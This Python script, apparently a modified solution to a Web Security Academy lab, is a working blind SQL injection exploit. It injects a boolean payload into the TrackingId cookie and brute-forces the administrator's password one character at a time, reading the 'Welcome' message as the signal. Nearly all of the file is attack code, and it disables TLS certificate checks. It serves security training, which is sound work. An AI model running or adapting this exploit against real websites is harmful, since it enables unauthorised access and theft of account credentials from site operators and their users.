# original source: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-11/sqli-lab-11.py
# modification: extract the cookies autoamtically instead of copying and pasting it in the code:
# usage: python http://example.com

import sys
import requests
import urllib3
import urllib
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url, trackingid, session):
    password_extracted = ""

    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': trackingid + sqli_payload_encoded, 'session': session}
            #r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            r = requests.get(url, cookies=cookies, verify=False)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def get_cookie(url):
    r = requests.get(url)
    headers = r.headers['set-cookie']
    cookie_pairs = re.findall(r'(\w+)=(\w+)', headers)
    cookies = {}

    for key, value in cookie_pairs:
        cookies[key] = value

    trackingid = cookies.get('TrackingId')
    session = cookies.get('session')
    return trackingid, session

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    trackingid, session = get_cookie(url)
    print("(+) Retrieving administrator password...")
    sqli_password(url, trackingid, session)

if __name__ == "__main__":
    main()
    
